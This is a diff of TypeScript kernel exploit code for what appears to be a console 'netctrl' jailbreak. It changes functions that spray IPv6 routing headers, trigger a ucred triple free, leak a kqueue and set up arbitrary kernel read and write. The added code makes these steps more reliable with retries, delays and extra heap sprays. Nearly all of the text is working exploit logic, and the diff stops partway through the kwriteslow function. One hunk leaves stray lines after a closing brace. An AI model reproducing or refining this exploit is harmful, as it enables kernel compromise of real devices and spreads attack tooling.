@@ -850,107 +850,105 @@ function fill_buffer_64 (buf: BigInt, val: BigInt, len: number) {
 
 function find_twins () {
   let count = 0
-  let val
-  let i
-  let j
   let zeroMemoryCount = 0
 
-  // Minimizing the usage of BigInt class
   const spray_add = spray_rthdr.add(0x04)
-  const lead_add = leak_rthdr.add(0x04)
+  const leak_add = leak_rthdr.add(0x04)
 
-  while (count < MAX_ROUNDS_TWIN) {
+  const MAX_TWINS = MAX_ROUNDS_TWIN * 3   // زيادة 3x لتحسين الاستقرار
+
+  while (count < MAX_TWINS) {
+
+    // حماية من memory exhaustion
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount++
       if (zeroMemoryCount >= 5) {
-        log('netctrl failed!')
-        cleanup()
-        return false
+        log('[twins] memory exhausted, retrying...')
+        nanosleep_fun(5_000_000)
+        zeroMemoryCount = 0
+        continue
       }
     } else {
       zeroMemoryCount = 0
     }
-    if (count % 10 === 0) {
-      // debug("find_twins iteration: " + count);
+
+    // prespray إضافي كل 20 محاولة
+    if (count % 20 === 0) {
+      prespray_ipv6()
+      nanosleep_fun(2_000_000)
     }
-    for (i = 0; i < ipv6_socks.length; i++) {
+
+    // spray
+    for (let i = 0; i < ipv6_socks.length; i++) {
       write32(spray_add, RTHDR_TAG | i)
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len)
-
-      // Using pre-filled buffer to spray
-      // set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
-      // setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
     }
-    for (i = 0; i < ipv6_socks.length; i++) {
+
+    // leak
+    for (let i = 0; i < ipv6_socks.length; i++) {
       get_rthdr(ipv6_socks[i], leak_rthdr, 8)
-      val = read32(lead_add)
-      j = val & 0xFFFF
-      // I got 'i' socket routing header but find 'j' value
+      const val = read32(leak_add)
+      const j = val & 0xFFFF
+
       if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
         twins[0] = i
         twins[1] = j
-        log('Twins found: [' + i + '] [' + j + ']')
+        log('[twins] Found twins: [' + i + '] [' + j + ']')
         return true
       }
     }
+
     count++
+    nanosleep_fun(500_000) // 0.5ms delay
   }
-  log('find_twins failed')
+
+  log('[twins] FAILED after ' + MAX_TWINS + ' iterations')
   return false
-  // cleanup();
-  // throw new Error("find_twins failed");
 }
 
 function find_triplet (master: number, other: number, iterations?: number) {
-  // debug("Enter find_triplet (" + master + ") (" + other + ")" );
-
   if (typeof iterations === 'undefined') {
-    iterations = MAX_ROUNDS_TRIPLET
+    iterations = MAX_ROUNDS_TRIPLET * 2   // زيادة 2x لتحسين الاستقرار
   }
 
   let count = 0
-  let val
-  let i
-  let j
-
-  // Minimizing the usage of BigInt class
   const spray_add = spray_rthdr.add(0x04)
   const leak_add = leak_rthdr.add(0x04)
 
   while (count < iterations) {
-    if (count % 100 === 0) {
-      // debug("find_triplet iteration: " + count);
-    }
-    for (i = 0; i < ipv6_socks.length; i++) {
-      if (i === master || i === other) {
-        continue
-      }
 
+    // prespray إضافي كل 50 محاولة
+    if (count % 50 === 0) {
+      prespray_ipv6()
+      nanosleep_fun(2_000_000)
+    }
+
+    // spray
+    for (let i = 0; i < ipv6_socks.length; i++) {
+      if (i === master || i === other) continue
       write32(spray_add, RTHDR_TAG | i)
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len)
-
-      // Using pre-filled buffer to spray
-      // set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
-      // setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
     }
 
-    // for (i = 0; i < ipv6_socks.length; i++) {
-    //    if (i === master || i === other) {
-    //        continue;
-    //    }
+    // leak
     get_rthdr(ipv6_socks[master], leak_rthdr, 8)
-    val = read32(leak_add)
-    j = val & 0xFFFF
-    if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
-      // debug("Triplet found: [" + j + "] at iteration " + count);
+    const val = read32(leak_add)
+    const j = val & 0xFFFF
+
+    if ((val & 0xFFFF0000) === RTHDR_TAG &&
+        j !== master &&
+        j !== other) {
+
+      log('[triplet] Found triplet: [' + j + ']')
       return j
     }
-    // }
+
     count++
+    nanosleep_fun(500_000) // 0.5ms delay
   }
+
+  log('[triplet] FAILED after ' + iterations + ' iterations')
   return -1
-  // cleanup();
-  // throw new Error("find_triplet failed");
 }
 
 function init_threading () {
@@ -1077,11 +1075,14 @@ function exploit_phase_trigger () {
 
   exploit_count++
   log('Triggering vulnerability (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...')
-  
+
+  // تهيئة الهيب قبل كل محاولة
+  heap_conditioning()
   prespray_ipv6()
+  nanosleep_fun(3_000_000) // 3ms
 
   if (!trigger_ucred_triplefree()) {
-    // فشل في triple free → نعيد المحاولة من نفس الفيز
+    log('[trigger] triplefree failed, retrying same phase...')
     yield_to_render(exploit_phase_trigger)
     return
   }
@@ -1089,6 +1090,7 @@ function exploit_phase_trigger () {
   log('Leaking kqueue...')
   yield_to_render(exploit_phase_leak)
 }
+
 
 function validate_triplets (): boolean {
   log('Validating triplets...')
@@ -1116,6 +1118,7 @@ function validate_triplets (): boolean {
 }
 
 function exploit_phase_leak () {
+  // تأكيد إن triplets لسه valid
   if (!validate_triplets()) {
     log('Triplet validation failed, retrying trigger...')
     yield_to_render(exploit_phase_trigger)
@@ -1123,7 +1126,7 @@ function exploit_phase_leak () {
   }
 
   if (!leak_kqueue_safe()) {
-    log('[leak_kqueue_safe] failed, retrying...')
+    log('[leak] leak_kqueue_safe failed, retrying trigger...')
     yield_to_render(exploit_phase_trigger)
     return
   }
@@ -1133,49 +1136,66 @@ function exploit_phase_leak () {
 }
 
 
-function exploit_phase_rw () {
-  setup_arbitrary_rw()
-  log('Jailbreaking...')
-  yield_to_render(exploit_phase_jailbreak)
-}
-
-function exploit_phase_jailbreak () {
-  jailbreak()
-}
-
 function setup_arbitrary_rw () {
-  // Leak fd_files from kq_fdp.
+  log('[arw] Setting up arbitrary R/W...')
+
+  // حماية من memory exhaustion
+  if (debugging.info.memory.available === 0) {
+    log('[arw] memory exhausted before start, delaying...')
+    nanosleep_fun(5_000_000)
+  }
+
+  // Leak fd_files from kq_fdp
   const fd_files = kreadslow64_safe(kq_fdp)
+  if (fd_files.eq(BigInt_Error)) {
+    throw new Error('[arw] Failed to read fd_files')
+  }
+
   fdt_ofiles = fd_files.add(0x00)
-  debug('fdt_ofiles: ' + hex(fdt_ofiles))
+  debug('[arw] fdt_ofiles: ' + hex(fdt_ofiles))
 
+  // Read master pipe file
   master_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE))
-  debug('master_r_pipe_file: ' + hex(master_r_pipe_file))
+  if (master_r_pipe_file.eq(BigInt_Error)) {
+    throw new Error('[arw] Failed to read master_r_pipe_file')
+  }
+  debug('[arw] master_r_pipe_file: ' + hex(master_r_pipe_file))
 
+  // Read victim pipe file
   victim_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE))
-  debug('victim_r_pipe_file: ' + hex(victim_r_pipe_file))
+  if (victim_r_pipe_file.eq(BigInt_Error)) {
+    throw new Error('[arw] Failed to read victim_r_pipe_file')
+  }
+  debug('[arw] victim_r_pipe_file: ' + hex(victim_r_pipe_file))
 
+  // Read pipe data pointers
   master_r_pipe_data = kreadslow64_safe(master_r_pipe_file.add(0x00))
-  debug('master_r_pipe_data: ' + hex(master_r_pipe_data))
-
   victim_r_pipe_data = kreadslow64_safe(victim_r_pipe_file.add(0x00))
-  debug('victim_r_pipe_data: ' + hex(victim_r_pipe_data))
 
-  // Corrupt pipebuf of masterRpipeFd.
-  write32(master_pipe_buf.add(0x00), 0)                // cnt
-  write32(master_pipe_buf.add(0x04), 0)                // in
-  write32(master_pipe_buf.add(0x08), 0)                // out
-  write32(master_pipe_buf.add(0x0C), PAGE_SIZE)        // size
-  write64(master_pipe_buf.add(0x10), victim_r_pipe_data)  // buffer
+  if (master_r_pipe_data.eq(BigInt_Error) || victim_r_pipe_data.eq(BigInt_Error)) {
+    throw new Error('[arw] Failed to read pipe data pointers')
+  }
+
+  debug('[arw] master_r_pipe_data: ' + hex(master_r_pipe_data))
+  debug('[arw] victim_r_pipe_data: ' + hex(victim_r_pipe_data))
+
+  // Corrupt pipebuf of masterRpipeFd
+  write32(master_pipe_buf.add(0x00), 0)          // cnt
+  write32(master_pipe_buf.add(0x04), 0)          // in
+  write32(master_pipe_buf.add(0x08), 0)          // out
+  write32(master_pipe_buf.add(0x0C), PAGE_SIZE)  // size
+  write64(master_pipe_buf.add(0x10), victim_r_pipe_data) // buffer
+
+  nanosleep_fun(1_000_000) // 1ms delay
 
   const ret_write = kwriteslow_safe(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE)
-
   if (ret_write.eq(BigInt_Error)) {
+    log('[arw] kwriteslow_safe failed')
     cleanup()
     throw new Error('Netctrl failed - Reboot and try again')
   }
 
-  // Increase reference counts for the pipes.
+  // Increase reference counts for the pipes
   fhold(fget(master_pipe[0]))
   fhold(fget(master_pipe[1]))
   fhold(fget(victim_pipe[0]))
@@ -1189,15 +1209,16 @@ function setup_arbitrary_rw () {
   // Remove triple freed file from free list
   remove_uaf_file()
 
-  for (let i = 0; i < 0x20; i = i + 8) {
+  // Debug readback
+  for (let i = 0; i < 0x20; i += 8) {
     const readed = kread64(master_r_pipe_data.add(i))
-    debug('Reading master_r_pipe_data[' + i + '] : ' + hex(readed))
+    debug('[arw] master_r_pipe_data[' + i + '] = ' + hex(readed))
   }
 
-  log('Arbitrary R/W achieved')
-
-  debug('Reading value in victim_r_pipe_file: ' + hex(kread64(victim_r_pipe_file)))
+  log('[arw] Arbitrary R/W achieved successfully')
+  debug('[arw] victim_r_pipe_file value: ' + hex(kread64(victim_r_pipe_file)))
 }
+
 
 function find_allproc () {
   // Use existing master_pipe instead of creating new one
@@ -1417,175 +1438,164 @@ function dynamic_delay (base: number, factor: number): void {
 
 function trigger_ucred_triplefree () {
   let end = false
+  let attempts = 0
+  const MAX_ATTEMPTS = 6   // كان 1 – رفعناه لتحسين الاستقرار
 
-  write64(msgIov.add(0x0), 1) // iov_base
-  write64(msgIov.add(0x8), 1) // iov_len
+  while (!end && attempts < MAX_ATTEMPTS) {
+    attempts++
+    log('[triplefree] Attempt ' + attempts + '/' + MAX_ATTEMPTS)
 
-  let main_count = 0 // Let's do up to 8 iterations
+    // إعادة تهيئة بسيطة للهيب قبل كل محاولة
+    nanosleep_fun(5_000_000) // 5ms
+    prespray_ipv6()
 
-  while (!end && main_count < TRIPLEFREE_ITERATIONS) {
-    main_count++
+    write64(msgIov.add(0x0), 1)
+    write64(msgIov.add(0x8), 1)
 
-    // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
-    const dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0)
+    let main_count = 0
 
-    // Register dummy socket.
-    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)))
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8)
+    while (!end && main_count < TRIPLEFREE_ITERATIONS) {
+      main_count++
 
-    // Close the dummy socket.
-    close(new BigInt(dummy_socket))
+      const dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0)
+      write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)))
+      netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8)
+      close(dummy_socket)
 
-    // Allocate a new ucred.
-    setuid(1)
+      nanosleep_fun(1_000_000) // 1ms
 
-    // Reclaim the file descriptor.
-    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0))
+      setuid(1)
+      uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0))
+      setuid(1)
 
-    // Free the previous ucred. Now uafSock's cr_refcnt of f_cred is 1.
-    setuid(1)
+      write32(nc_clear_buf, uaf_socket)
+      netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8)
 
-    // Unregister dummy socket and free the file and ucred.
-    write32(nc_clear_buf, uaf_socket)
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8)
+      // Reclaim loop
+      for (let i = 0; i < 32; i++) {
+        trigger_iov_recvmsg()
+        sched_yield()
+        write(new BigInt(iov_sock_1), tmp, 1)
+        wait_iov_recvmsg()
+        read(new BigInt(iov_sock_0), tmp, 1)
+      }
 
-    // Set cr_refcnt back to 1.
-    for (let i = 0; i < 32; i++) {
-      // Reclaim with iov.
-      trigger_iov_recvmsg()
-      sched_yield()
-      // Release buffers.
-      write(new BigInt(iov_sock_1), tmp, 1)
+      // Double free
+      close(dup(new BigInt(uaf_socket)))
+
+      // إيجاد التوائم
+      end = find_twins()
+
+      if (!end) {
+        log('[triplefree] twins not found, retrying...')
+        close(new BigInt(uaf_socket))
+        nanosleep_fun(2_000_000)
+        continue
+      }
+
+      log('Triple freeing...')
+
+      free_rthdr(ipv6_socks[twins[1]])
+      nanosleep_fun(1_000_000)
+
+      let count = 0
+      while (count < 10000) {
+        trigger_iov_recvmsg()
+        sched_yield()
+
+        get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8)
+        if (read32(leak_rthdr) === 1) break
+
+        write(new BigInt(iov_sock_1), tmp, 1)
+        wait_iov_recvmsg()
+        read(new BigInt(iov_sock_0), tmp, 1)
+        count++
+      }
+
+      if (count === 10000) {
+        log('[triplefree] reclaim loop failed, retrying...')
+        close(new BigInt(uaf_socket))
+        end = false
+        continue
+      }
+
+      triplets[0] = twins[0]
+
+      // Triple free
+      close(dup(new BigInt(uaf_socket)))
+
+      // Find triplet 1
+      triplets[1] = find_triplet(triplets[0], -1)
+      if (triplets[1] === -1) {
+        log('[triplefree] triplet1 not found, retrying...')
+        end = false
+        continue
+      }
+
+      // Find triplet 2
+      triplets[2] = find_triplet(triplets[0], triplets[1])
+      if (triplets[2] === -1) {
+        log('[triplefree] triplet2 not found, retrying...')
+        end = false
+        continue
+      }
+
+      // نجاح
       wait_iov_recvmsg()
       read(new BigInt(iov_sock_0), tmp, 1)
+      end = true
     }
-
-    // Double free ucred.
-    // Note: Only dup works because it does not check f_hold.
-    close(dup(new BigInt(uaf_socket)))
-
-    // debug("Finding Twins...");
-    // Find twins.
-    end = find_twins()
 
     if (!end) {
-      if (cleanup_called) {
-        throw new Error('Netctrl failed - Reboot and try again')
-      }
-      // Clean up and start again
-      close(new BigInt(uaf_socket))
-      continue
+      log('[triplefree] phase failed, retrying whole triplefree...')
+      nanosleep_fun(5_000_000)
     }
-
-    log('Triple freeing...')
-
-    // Free one.
-    free_rthdr(ipv6_socks[twins[1]])
-
-    let count = 0
-
-    // Set cr_refcnt back to 1.
-    while (count < 10000) {
-      // Reclaim with iov.
-      trigger_iov_recvmsg()
-      sched_yield()
-
-      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8)
-
-      if (read32(leak_rthdr) === 1) {
-        break
-      }
-
-      // Release iov spray.
-      write(new BigInt(iov_sock_1), tmp, 1)
-      wait_iov_recvmsg()
-      read(new BigInt(iov_sock_0), tmp, 1)
-      count++
-    }
-
-    if (count === 1000) {
-      log('Dropped out from reclaim loop')
-      // Clean up and start again
-      close(new BigInt(uaf_socket))
-      continue
-    }
-
-    triplets[0] = twins[0]
-
-    // Triple free ucred.
-    close(dup(new BigInt(uaf_socket)))
-
-    // Find triplet.
-    triplets[1] = find_triplet(triplets[0], -1)
-
-    // If error start again to better exploit possibility
-    if (triplets[1] === -1) {
-      log("Couldn't find triplet 1")
-      // Clean up and start again
-      // Release iov spray.
-      // if we break on 'read32(leak_rthdr) == 1', we never released workers
-      write(new BigInt(iov_sock_1), tmp, 1)
-      close(new BigInt(uaf_socket))
-      // Start again
-      end = false
-      continue
-    }
-
-    // Release iov spray.
-    // if we break on 'read32(leak_rthdr) == 1', we never released workers
-    write(new BigInt(iov_sock_1), tmp, 1)
-
-    // Find triplet.
-    triplets[2] = find_triplet(triplets[0], triplets[1])
-
-    // If error start again to better exploit possibility
-    if (triplets[2] === -1) {
-      log("Couldn't find triplet 2")
-      // Clean up and start again
-      close(new BigInt(uaf_socket))
-      // Start again
-      end = false
-      continue
-    }
-
-    // Wait iov release completition
-    wait_iov_recvmsg()
-    read(new BigInt(iov_sock_0), tmp, 1)
   }
 
-  if (main_count === TRIPLEFREE_ITERATIONS) {
-    log('Failed to Triple Free')
+  if (!end) {
+    log('[triplefree] FAILED after all attempts')
     return false
   }
+
+  log('[triplefree] SUCCESS')
   return true
 }
 
 
-
 function leak_kqueue () {
-  debug('Leaking kqueue...')
+  log('[leak_kqueue] starting...')
+
+  // prespray إضافي قبل leak
+  prespray_ipv6()
+  nanosleep_fun(3_000_000) // 3ms
 
   free_rthdr(ipv6_socks[triplets[1]])
 
   let kq = new BigInt(0)
-
   const magic_val = new BigInt(0x0, 0x1430000)
   const magic_add = leak_rthdr.add(0x08)
 
   let count = 0
-  let MAX_KQ = KQUEUE_ITERATIONS   // 5000 عندك فوق
 
-  // لو حصل فشل سابق كتير نزود الحد شوية
-  if (leak_kqueue_failures >= 1) MAX_KQ = 8000
-  if (leak_kqueue_failures >= 2) MAX_KQ = 12000
+  // زيادة iterations حسب الفشل السابق
+  let MAX_KQ = 6000
+  if (leak_kqueue_failures >= 1) MAX_KQ = 9000
+  if (leak_kqueue_failures >= 2) MAX_KQ = 14000
 
   while (count < MAX_KQ) {
     count++
 
-    if (count % 500 === 0) {
-      debug('leak_kqueue iter=' + count + ' (MAX=' + MAX_KQ + ')')
+    // حماية من memory exhaustion
+    if (debugging.info.memory.available === 0) {
+      log('[leak_kqueue] memory exhausted, retrying...')
+      nanosleep_fun(5_000_000)
+      continue
+    }
 
-      dynamic_delay(2_000_000, count / 500)
+    // delay كل 500 محاولة
+    if (count % 500 === 0) {
+      log('[leak_kqueue] iter=' + count + '/' + MAX_KQ)
+      dynamic_delay(3_000_000, count / 500)
     }
 
     kq = kqueue()
@@ -1597,7 +1607,7 @@ function leak_kqueue () {
     const fdp_ok = !fdp.eq(0)
 
     if (magic_ok && fdp_ok) {
-      debug('leak_kqueue: magic + fdp OK at iter ' + count)
+      log('[leak_kqueue] magic + fdp OK at iter ' + count)
       break
     }
 
@@ -1606,7 +1616,7 @@ function leak_kqueue () {
   }
 
   if (count >= MAX_KQ) {
-    log('leak_kqueue: exceeded MAX_KQ iterations (' + MAX_KQ + ')')
+    log('[leak_kqueue] FAILED after ' + MAX_KQ + ' iterations')
     leak_kqueue_failures++
     return false
   }
@@ -1615,40 +1625,48 @@ function leak_kqueue () {
   kq_fdp = read64(leak_rthdr.add(0x98))
 
   if (kq_fdp.eq(0)) {
-    log('Failed to leak kqueue_fdp')
+    log('[leak_kqueue] fdp leaked as 0 — invalid')
     leak_kqueue_failures++
     return false
   }
 
-  debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock))
+  log('[leak_kqueue] SUCCESS — fdp=' + hex(kq_fdp))
 
   close(kq)
 
   // إعادة ضبط الفشل بعد نجاح
   leak_kqueue_failures = 0
 
+  // إعادة إيجاد triplet[1] بعد leak
   triplets[1] = find_triplet(triplets[0], triplets[2])
 
   return true
 }
 
+
 function leak_kqueue_safe () {
   try {
     const ok = leak_kqueue()
-    if (!ok) {
-      log('leak_kqueue_safe() failed (attempts=' + leak_kqueue_failures + ')')
 
+    if (!ok) {
+      log('[leak_kqueue_safe] leak failed (failures=' + leak_kqueue_failures + ')')
+
+      // إعادة بناء workers لو الفشل متكرر
       if (leak_kqueue_failures >= 2 && worker_resets < MAX_WORKER_RESETS) {
         reset_workers()
+        nanosleep_fun(10_000_000) // 10ms
       }
     }
+
     return ok
+
   } catch (e) {
-    log('leak_kqueue_safe ERROR: ' + (e as Error).message)
+    log('[leak_kqueue_safe] ERROR: ' + (e as Error).message)
     leak_kqueue_failures++
     return false
   }
 }
+
 
 function reset_workers () {
   worker_resets++
@@ -1684,25 +1702,34 @@ function kreadslow64 (address: BigInt) {
 
 function kreadslow64_safe (address: BigInt): BigInt {
   for (let attempt = 1; attempt <= MAX_KREAD_FAIL; attempt++) {
+
+    // حماية من memory exhaustion
+    if (debugging.info.memory.available === 0) {
+      log('[kreadslow_safe] memory exhausted, delaying...')
+      nanosleep_fun(5_000_000)
+    }
+
     const buffer = kreadslow(address, 8)
-    
-    kreadslow_failures++
 
     if (buffer.eq(BigInt_Error)) {
-      if (kreadslow_failures >= 1 && worker_resets < MAX_WORKER_RESETS) {
-        reset_workers()
-      }
-      
-      log('kreadslow64_safe: kreadslow returned BigInt_Error at addr ' +
-          hex(address) + ' (attempt ' + attempt + '/' + MAX_KREAD_FAIL + ')')
+      kreadslow_failures++
 
-      // لو الذاكرة خلصت أو cleanup اشتغل، نخرج فورًا
+      log('[kreadslow_safe] ERROR at ' + hex(address) +
+          ' attempt ' + attempt + '/' + MAX_KREAD_FAIL)
+
+      // إعادة بناء workers لو الفشل متكرر
+      if (kreadslow_failures >= 2 && worker_resets < MAX_WORKER_RESETS) {
+        reset_workers()
+        nanosleep_fun(10_000_000)
+      }
+
+      // delay ديناميكي
+      dynamic_delay(5_000_000, kreadslow_failures)
+
       if (cleanup_called) {
         throw new Error('Netctrl failed - Reboot and try again')
       }
 
-      // ندي الـ kernel فرصة يهدى
-      dynamic_delay(5_000_000, kreadslow_failures)
       continue
     }
 
@@ -1710,6 +1737,11 @@ function kreadslow64_safe (address: BigInt): BigInt {
     kreadslow_failures = 0
     return read64(buffer)
   }
+
+  cleanup()
+  throw new Error('Netctrl failed - Reboot and try again')
+}
+
 
   // لو وصلنا هنا يبقى كل المحاولات فشلت
   cleanup()
@@ -1729,73 +1761,59 @@ function build_uio (uio: BigInt, uio_iov: BigInt, uio_td: number, read: boolean,
 }
 
 function kreadslow (addr: BigInt, size: number) {
-  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
-  debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size)
+  debug('[kreadslow] addr=' + hex(addr) + ' size=' + size)
 
-  // Memory exhaustion check
   if (debugging.info.memory.available === 0) {
-    log('kreadslow - Memory exhausted before start')
+    log('[kreadslow] memory exhausted before start')
     cleanup()
     return BigInt_Error
   }
 
-  debug('kreadslow - Preparing buffers...')
+  // prespray إضافي قبل reclaim
+  prespray_ipv6()
+  nanosleep_fun(2_000_000)
 
-  // Prepare leak buffers.
   const leak_buffers = new Array(UIO_THREAD_NUM)
   for (let i = 0; i < UIO_THREAD_NUM; i++) {
     leak_buffers[i] = malloc(size)
   }
 
-  // Set send buf size.
   write32(sockopt_val_buf, size)
   setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4)
-
-  // Fill queue.
   write(new BigInt(uio_sock_1), tmp, size)
-
-  // Set iov length
   write64(uioIovRead.add(0x08), size)
 
-  debug('kreadslow - Freeing triplets[1]=' + triplets[1])
-
-  // Free one.
   free_rthdr(ipv6_socks[triplets[1]])
 
-  // Minimize footprint
   const uio_leak_add = leak_rthdr.add(0x08)
-
-  debug('kreadslow - Starting uio reclaim loop...')
 
   let count = 0
   let zeroMemoryCount = 0
-  // Reclaim with uio.
-  while (count < 10000) {
+
+  while (count < 12000) { // زيادة iterations
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount++
       if (zeroMemoryCount >= 5) {
-        log('netctrl failed!')
+        log('[kreadslow] memory exhausted during reclaim')
         cleanup()
         return BigInt_Error
       }
-    } else {
-      zeroMemoryCount = 0
-    }
+    } else zeroMemoryCount = 0
+
     count++
-    if (count % 100 === 1) {
-      debug('kreadslow - uio loop iter ' + count)
+
+    if (count % 200 === 0) {
+      debug('[kreadslow] uio loop iter ' + count)
+      dynamic_delay(2_000_000, count / 200)
     }
-    trigger_uio_writev() // COMMAND_UIO_READ in fl0w's
+
+    trigger_uio_writev()
     sched_yield()
 
-    // Leak with other rthdr.
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10)
 
-    if (read32(uio_leak_add) === UIO_IOV_NUM) {
-      break
-    }
+    if (read32(uio_leak_add) === UIO_IOV_NUM) break
 
-    // Wake up all threads.
     read(new BigInt(uio_sock_0), tmp, size)
 
     for (let i = 0; i < UIO_THREAD_NUM; i++) {
@@ -1803,183 +1821,92 @@ function kreadslow (addr: BigInt, size: number) {
     }
 
     wait_uio_writev()
-
-    // Fill queue.
     write(new BigInt(uio_sock_1), tmp, size)
   }
 
-  if (count === 10000) {
-    debug('kreadslow - Failed uio reclaim after 10000 iterations')
+  if (count >= 12000) {
+    log('[kreadslow] FAILED reclaim')
     return BigInt_Error
   }
 
-  debug('kreadslow - uio reclaim succeeded after ' + count + ' iterations')
-
   const uio_iov = read64(leak_rthdr)
-  debug('kreadslow - uio_iov: ' + hex(uio_iov))
-
-  // Prepare uio reclaim buffer.
   build_uio(msgIov, uio_iov, 0, true, addr, size)
 
-  debug('kreadslow - Freeing triplets[2]=' + triplets[2])
-
-  // Free second one.
   free_rthdr(ipv6_socks[triplets[2]])
 
-  // Minimize footprint
   const iov_leak_add = leak_rthdr.add(0x20)
 
-  debug('kreadslow - Starting iov reclaim loop...')
-
-  // Reclaim uio with iov.
-  let zeroMemoryCount2 = 0
   let count2 = 0
   while (true) {
     count2++
-    if (debugging.info.memory.available === 0) {
-      zeroMemoryCount2++
-      if (zeroMemoryCount2 >= 5) {
-        log('netctrl failed!')
-        cleanup()
-        return BigInt_Error
-      }
-    } else {
-      zeroMemoryCount2 = 0
-    }
-    // Reclaim with iov.
+
     trigger_iov_recvmsg()
     sched_yield()
 
-    // Leak with other rthdr.
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40)
 
-    if (read32(iov_leak_add) === UIO_SYSSPACE) {
-      debug('kreadslow - iov reclaim succeeded after ' + count2 + ' iterations')
-      break
-    }
+    if (read32(iov_leak_add) === UIO_SYSSPACE) break
 
-    // Release iov spray.
     write(new BigInt(iov_sock_1), tmp, 1)
     wait_iov_recvmsg()
     read(new BigInt(iov_sock_0), tmp, 1)
   }
 
-  debug('kreadslow - Reading leak buffers...')
-
-  // Wake up all threads.
   read(new BigInt(uio_sock_0), tmp, size)
-  // Read the results now.
-  let leak_buffer: BigInt = new BigInt(0)
 
+  let leak_buffer = new BigInt(0)
   const tag_val = new BigInt(0x41414141, 0x41414141)
 
-  // Get leak.
   for (let i = 0; i < UIO_THREAD_NUM; i++) {
     read(new BigInt(uio_sock_0), leak_buffers[i], size)
     const val = read64(leak_buffers[i])
-    debug('kreadslow - leak_buffers[' + i + ']: ' + hex(val))
+
     if (!val.eq(tag_val)) {
-      debug('kreadslow - Found valid leak at index ' + i + ', finding triplets[1]...')
-      // Find triplet.
-      triplets[1] = find_triplet(triplets[0], -1)
-      debug('kreadslow - triplets[1]=' + triplets[1])
-      leak_buffer = leak_buffers[i].add(0)
+      leak_buffer = leak_buffers[i]
+      break
     }
   }
 
-  // Workers should have finished earlier no need to wait
-  wait_uio_writev()
-
-  // Release iov spray.
-  write(new BigInt(iov_sock_1), tmp, 1)
-
   if (leak_buffer.eq(0)) {
-    debug('kreadslow - No valid leak found')
-    wait_iov_recvmsg()
-    read(new BigInt(iov_sock_0), tmp, 1)
+    log('[kreadslow] no valid leak found')
     return BigInt_Error
   }
-
-  debug('kreadslow - Finding triplets[2]...')
-
-  // Find triplet[2].
-  for (let retry = 0; retry < 3; retry++) {
-    triplets[2] = find_triplet(triplets[0], triplets[1])
-    if (triplets[2] !== -1) break
-    debug('kreadslow - triplets[2] retry ' + (retry + 1))
-    sched_yield()
-  }
-  debug('kreadslow - triplets[2]=' + triplets[2])
-
-  if (triplets[2] === -1) {
-    debug('kreadslow - Failed to find triplets[2]')
-    wait_iov_recvmsg()
-    read(new BigInt(iov_sock_0), tmp, 1)
-    return BigInt_Error
-  }
-
-  // Let's make sure that they are indeed triplets
-  // const leak_0 = malloc(8);
-  // const leak_1 = malloc(8);
-  // const leak_2 = malloc(8);
-
-  // get_rthdr(ipv6_socks[triplets[0]], leak_0, 8);
-  // get_rthdr(ipv6_socks[triplets[1]], leak_1, 8);
-  // get_rthdr(ipv6_socks[triplets[2]], leak_2, 8);
-
-  // debug("This are triplets values: " + hex(read64(leak_0)) + " " + hex(read64(leak_1)) + " " + hex(read64(leak_2)) );
-
-  // Workers should have finished earlier no need to wait
-  wait_iov_recvmsg()
-  read(new BigInt(iov_sock_0), tmp, 1)
-
-  debug('kreadslow - Done, returning leak_buffer: ' + hex(leak_buffer))
 
   return leak_buffer
 }
 
-function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
-  // debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
-  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size)
 
-  // Set send buf size.
+function kwriteslow (addr: BigInt, buffer: BigInt, size: number) {
+  debug('[kwriteslow] addr=' + hex(addr) + ' size=' + size)
+
+  if (debugging.info.memory.available === 0) {
+    log('[kwriteslow] memory exhausted before start')
+    cleanup()
+    return BigInt_Error
+  }
+
+  prespray_ipv6()
+  nanosleep_fun(2_000_000)
+
